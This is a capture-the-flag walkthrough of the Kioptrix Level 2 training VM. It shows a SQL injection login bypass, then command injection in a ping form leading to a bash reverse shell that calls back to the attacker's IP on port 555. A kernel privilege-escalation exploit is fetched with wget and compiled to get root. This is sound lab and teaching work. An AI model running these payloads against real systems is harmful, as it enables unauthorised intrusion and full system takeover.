# Kiotrix Level 2
## Setup:
1. Download the Kioptrix VM from [Kioptrix level 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).
2. Use RAR to extract the compressed file.
3. Launch VMware player and select the "Kioptrix level 2.vmx" file.(since Kipotrix uses DHCP, I used Bridged Networking)
4. Create a Kioptrix_2 directory within root's home directory, on the system.
## Information Gathering:
Netdiscover:

We use this scanner to discover the vulnerable IP 
Here I got the IP of the vulnerable machine as 192.168.0.170 
### Nmap:

After the ip has been found, we use nmap    
```bash
nmap -sS -A -n [ip] 
``` 
to find all the open ports and services running. After the scan we can see that there is MySql running on port 3306. From that we can assume that this site is connected to a database.  
## Exploit
### SQL Injection and Command Injection:

When we navigate to the site hosted by the VM, we get a login page which consists of user and password input fields. Here we can try to login using SQL Injection. 

When we enter 1' or '1'='1 on both username and password it will alter the SQL query in a way that it returns true for both the input fields. Then we can move on to a console which pings the input entered.

 Here we can try using command injection and it works i.e we can terminate the ping command using ‘ ; ‘ and continue to enter commands and execute.
 
  By taking advantage of this command injection vulnerability we can invoke a reverse shell. To create it, first we start a netcat listener on attackers machine for port 555 using nc -nlvp 555 and enter 
```bash 
;bash -i >& /dev/tcp/192.168.1.120/555 0>&1
```
In the input field to create a reverse shell

After connecting to the victims machine, we will check Linux version that the machine is running on using 
```bash
cat /proc/version 
```
We will get the output as **Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8))** 

### Exploit: 

Next we have to search about the linux version and we can find that there is a Privilege Escalation Exploit.

 https://www.exploit-db.com/exploits/9542 

After downloading this exploit we can find that it is a c file and from the reverse shell we can find out there is a gcc compiler present.

So what we have to do is we have to move that exploit file to the victims machine.Then we have to move the exploit file to 
```bash
var/www/html 
```
directory and start an apache server using 
```bash
service apache2 start 
```
Then we have to move to /tmp directory in the reverse shell and get the contents by connecting to the attackers machine and using wget command to get the exploit file.
 
Then we have to compile the exploit file using 
```bash
gcc exploit.c -o exploit
``` 
Then we can get root access by running the executable file.